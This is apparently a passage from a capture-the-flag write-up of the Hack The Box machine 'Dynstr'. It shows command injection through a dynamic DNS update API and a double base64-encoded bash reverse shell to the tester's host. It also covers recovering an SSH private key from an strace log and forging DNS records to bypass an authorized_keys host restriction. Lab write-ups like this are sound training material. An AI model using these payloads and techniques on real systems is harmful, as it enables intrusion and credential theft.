</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">38459</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.no-ip.htb.                        IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.no-ip.htb.         <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">864</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:23:34 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">87</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="identify-command-injection">Identify Command Injection</h4>
<p>On Linux, there is a dynamic DNS utility called <a href="https://linux.die.net/man/8/nsupdate"><code>nsupdate</code></a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p>
<p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p>
<p><div class="img-container"><img src="imgs/image-20210617091628552.png" alt="image-20210617091628552"  /></div>
</p>
<p>If I search for that error on Google, I will see <a href="https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function">this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p>
<p><div class="img-container"><img src="imgs/image-20211018060424803.png" alt="image-20211018060424803"  /></div>
</p>
<p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit  <strong>`echo+iamf1`</strong>.<div class="img-container"><img src="imgs/image-20210617093614041.png" alt="image-20210617093614041"  /></div>
</p>
<p>It again responded with &ldquo;good&rdquo;.</p>
<p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">65360</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf1.no-ip.htb.               IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf1.no-ip.htb.        <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">735</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:36:20 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">88</span>
</span></span></code></pre></div><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>&quot;</code> to enclose it, the server response leaks how it updates the DNS entry.</p>
<p><div class="img-container"><img src="imgs/image-20210617101554395.png" alt="image-20210617101554395"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span>base64 <span class="p">|</span>base64 -w0
</span></span><span class="line"><span class="cl"><span class="nv">WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class="o">==</span>
</span></span></code></pre></div><p>The final query will looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53
</span></span></code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.53<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244<span class="o">]</span> <span class="m">49648</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>659<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ which python3
</span></span><span class="line"><span class="cl">which python3
</span></span><span class="line"><span class="cl">/usr/bin/python3
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ython3 -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-bindmgr">Shell as bindmgr</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">428</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">237141</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.script
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">29312</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.timing
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr   <span class="m">1175</span> Mar <span class="m">13</span> 14:53 command-output-C62796521.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">163048</span> Mar <span class="m">13</span> 14:52 strace-C62796521.txt
</span></span></code></pre></div><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="m">15123</span> openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> fstat<span class="o">(</span>5, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0600, <span class="nv">st_size</span><span class="o">=</span>1823, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> read<span class="o">(</span>5, <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class="o">)</span> <span class="o">=</span> <span class="m">1823</span>
</span></span></code></pre></div><p>But when I try to use that key for SSH login, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">bindmgr@10.10.10.244<span class="err">&#39;</span>s password:
</span></span></code></pre></div><p>My first guess is SSH has been configured to password only, but I find that <a href="https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option">UseDNS</a> is enabled here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class="p">|</span> grep -v <span class="s1">&#39;^#&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span>
</span></span><span class="line"><span class="cl">Include /etc/ssh/sshd_config.d/*.conf
</span></span><span class="line"><span class="cl">PermitRootLogin yes
</span></span><span class="line"><span class="cl">ChallengeResponseAuthentication no
</span></span><span class="line"><span class="cl">UsePAM yes
</span></span><span class="line"><span class="cl">X11Forwarding yes
</span></span><span class="line"><span class="cl">PrintMotd no
</span></span><span class="line"><span class="cl">UseDNS yes
</span></span><span class="line"><span class="cl">AcceptEnv LANG LC_*
</span></span><span class="line"><span class="cl">Subsystem       sftp    /usr/lib/openssh/sftp-server
</span></span></code></pre></div><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ ls -l .ssh/
</span></span><span class="line"><span class="cl">ls -l
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">419</span> Mar <span class="m">13</span> 14:53 authorized_keys
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> bindmgr bindmgr <span class="m">1823</span> Mar <span class="m">13</span> 14:53 id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">395</span> Mar <span class="m">13</span> 14:53 id_rsa.pub
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">444</span> Mar <span class="m">13</span> 14:53 known_hosts
</span></span><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
</span></span><span class="line"><span class="cl"><span class="nv">from</span><span class="o">=</span><span class="s2">&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</span></span></code></pre></div><h4 id="update-dns">Update DNS</h4>
<p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind/$ cat named.conf.local
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">// Do any <span class="nb">local</span> configuration here
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Add infrastructure DNS updates.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/infra.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dyna.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dyna.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;10.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;10.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;168.192.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;168.192.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">// Enable DynDNS updates to customer zones.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/ddns.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dnsalias.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dnsalias.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dynamicdns.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dynamicdns.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;no-ip.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;no-ip.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// *** WORK IN PROGRESS, see bindmgr.sh ***
</span></span><span class="line"><span class="cl">// include <span class="s2">&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
</span></span><span class="line"><span class="cl">&gt; update add iamf.infra.dyna.htb <span class="m">3600</span> A 10.10.14.53
</span></span><span class="line"><span class="cl">&gt; update add 53.14.10.10.in-addr.arpa. <span class="m">600</span> PTR iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">&gt; show
</span></span><span class="line"><span class="cl">Outgoing update query:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags:<span class="p">;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> UPDATE SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">0</span>       ANY     A
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">53.14.10.10.in-addr.arpa. <span class="m">600</span>   IN      PTR     iamf.infra.dyna.htb.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; send
</span></span></code></pre></div><p>I can confirm with dig that my domain has been added.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">56211</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.infra.dyna.htb.           IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">59</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Thu Jun <span class="m">17</span> 08:31:59 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">92</span>
</span></span></code></pre></div><h4 id="ssh-bindmgr">SSH bindmgr</h4>
<p>Now I can SSH login as bindmgr</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">Last login: Tue Jun  <span class="m">8</span> 19:19:17 <span class="m">2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span></code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ cat user.txt
</span></span><span class="line"><span class="cl">6404e...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bindmgr on dynstr:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
